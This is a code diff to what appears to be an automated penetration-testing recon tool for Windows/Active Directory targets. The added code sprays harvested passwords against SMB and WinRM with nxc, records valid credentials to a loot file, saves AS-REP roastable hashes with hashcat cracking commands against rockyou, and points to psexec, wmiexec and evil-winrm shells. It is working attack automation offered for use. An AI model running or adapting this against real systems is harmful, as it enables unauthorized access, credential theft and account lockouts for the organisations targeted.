@@ -168,6 +168,12 @@ def main():
     if effective_domain:
         _run_post_domain_checks(args.ip, effective_domain, runner, findings, ws, available)
 
+    # ── Phase 3.6: Credential re-use ──────────────────────────────────────────
+    creds_file = ws.loot_dir / "creds_found.txt"
+    users_file = ws.loot_dir / "users.txt"
+    if creds_file.exists() and users_file.exists() and creds_file.stat().st_size > 0:
+        _run_cred_reuse(args.ip, runner, findings, ws, services, available)
+
     # ── Phase 4: Follow-up on discovered vhosts / SSL SANs / redirects ────────
     new_hosts: list[tuple[Discovery, Service]] = []
 
@@ -263,6 +269,13 @@ def _run_post_domain_checks(
         if "$krb5asrep$" in out:
             findings.bullet("**AS-REP roastable hash(es) found — crack with: `hashcat -m 18200`**")
             findings.code_block(out.strip())
+            hash_file = ws.loot_dir / "asrep.hash"
+            with open(hash_file, "a") as hf:
+                for line in out.splitlines():
+                    if "$krb5asrep$" in line:
+                        hf.write(line.strip() + "\n")
+            findings.bullet(f"**Hash saved:** `{hash_file}` — `hashcat -m 18200 {hash_file} /usr/share/wordlists/rockyou.txt`")
+            findings.add_summary(f"**AS-REP hash(es) in `loot/asrep.hash`** — crack: `hashcat -m 18200`")
         else:
             findings.bullet("AS-REP roasting: no vulnerable accounts in user list")
 
@@ -281,6 +294,83 @@ def _run_post_domain_checks(
         f"Kerberoasting (needs creds): "
         f"`impacket-GetUserSPNs {domain}/USER:PASS -dc-ip {ip} -request -outputfile spns.txt`"
     )
+
+
+def _run_cred_reuse(
+    ip: str, runner: Runner, findings: Findings,
+    ws: Workspace, services: list[Service], available: set[str],
+):
+    """
+    Spray each password from loot/creds_found.txt against SMB and WinRM
+    using the full loot/users.txt list.  Respects the discovered lockout
+    threshold: warns when > 0, proceeds freely when 0 or unknown.
+    """
+    creds_file = ws.loot_dir / "creds_found.txt"
+    users_file = ws.loot_dir / "users.txt"
+    passwords = [l.strip() for l in creds_file.read_text().splitlines() if l.strip()]
+    if not passwords:
+        return
+
+    findings.h2("Credential Re-use")
+
+    threshold = ws.lockout_threshold
+    if threshold == 0:
+        findings.bullet("**No account lockout — spraying all discovered passwords**")
+    elif threshold > 0:
+        findings.note(
+            f"**Lockout threshold: {threshold}** — spraying one password at a time; "
+            "monitor for lockouts"
+        )
+    else:
+        findings.bullet("Lockout policy unknown — spraying cautiously (one password at a time)")
+
+    open_tcp = {s.port for s in services if s.proto == "tcp"}
+
+    for password in passwords:
+        if "nxc" not in available:
+            break
+
+        if 445 in open_tcp:
+            cmd = [
+                "nxc", "smb", ip,
+                "-u", str(users_file), "-p", password,
+                "--continue-on-success",
+            ]
+            out = runner.run(cmd, f"cred_smb_{re.sub(r'[^a-z0-9]', '_', password.lower())[:16]}", timeout=120)
+            findings.cmd(" ".join(cmd))
+            for line in out.splitlines():
+                if "[+]" in line:
+                    if "Pwn3d!" in line:
+                        findings.bullet(f"**ADMIN access via SMB:** `{line.strip()}`")
+                        findings.add_summary(f"**Admin SMB shell** with `{password}` — `psexec`/`wmiexec`")
+                    else:
+                        findings.bullet(f"**Valid SMB credential:** `{line.strip()}`")
+                        findings.add_summary(f"Valid SMB credential: `{password}`")
+                    _save_valid_cred(ws, line.strip(), password)
+
+        if 5985 in open_tcp:
+            cmd2 = [
+                "nxc", "winrm", ip,
+                "-u", str(users_file), "-p", password,
+                "--continue-on-success",
+            ]
+            out2 = runner.run(cmd2, f"cred_winrm_{re.sub(r'[^a-z0-9]', '_', password.lower())[:16]}", timeout=120)
+            findings.cmd(" ".join(cmd2))
+            for line in out2.splitlines():
+                if "[+]" in line:
+                    findings.bullet(f"**Valid WinRM credential (shell!):** `{line.strip()}`")
+                    findings.add_summary(
+                        f"**WinRM shell** with `{password}` — "
+                        f"`evil-winrm -i {ip} -u USER -p {password}`"
+                    )
+                    _save_valid_cred(ws, line.strip(), password)
+
+
+def _save_valid_cred(ws: Workspace, line: str, password: str):
+    m = re.search(r"\\(\S+)", line)
+    username = m.group(1) if m else "unknown"
+    with open(ws.loot_dir / "valid_creds.txt", "a") as f:
+        f.write(f"{username}:{password}\n")
 
 
 def _dedup_services(services: list[Service]) -> list[Service]:
@@ -311,14 +401,34 @@ def _dedup_services(services: list[Service]) -> list[Service]:
     return [s for s in services if (s.port, s.proto) not in drop]
 
 
+_SS_NOISE = re.compile(
+    r"Windows\s+(XP|2000|NT\s*4|9[58]|ME)\b|"
+    r"\bSolaris\s+\d|\bAIX\s+\d|\bIRIX\s+\d",
+    re.IGNORECASE,
+)
+
 def _write_searchsploit(output: str, findings: Findings):
-    lines = [
-        l for l in output.splitlines()
-        if l.strip() and not l.startswith("-") and "Exploits" not in l and "ShellCodes" not in l
-    ]
-    if lines:
-        for line in lines:
-            findings.bullet(line.strip())
+    seen: set[str] = set()
+    kept: list[str] = []
+    for line in output.splitlines():
+        s = line.strip()
+        if not s:
+            continue
+        if s.startswith("-") or "Exploit Title" in s or "ShellCodes" in s or "Exploits:" in s:
+            continue
+        if _SS_NOISE.search(s):
+            continue
+        key = s.rsplit("|", 1)[-1].strip() if "|" in s else s
+        if key in seen:
+            continue
+        seen.add(key)
+        kept.append(s)
+
+    if kept:
+        for line in kept[:25]:
+            findings.bullet(line)
+        if len(kept) > 25:
+            findings.note(f"{len(kept) - 25} additional results omitted — run `searchsploit --nmap` manually")
     else:
         findings.note("No searchsploit matches.")
 
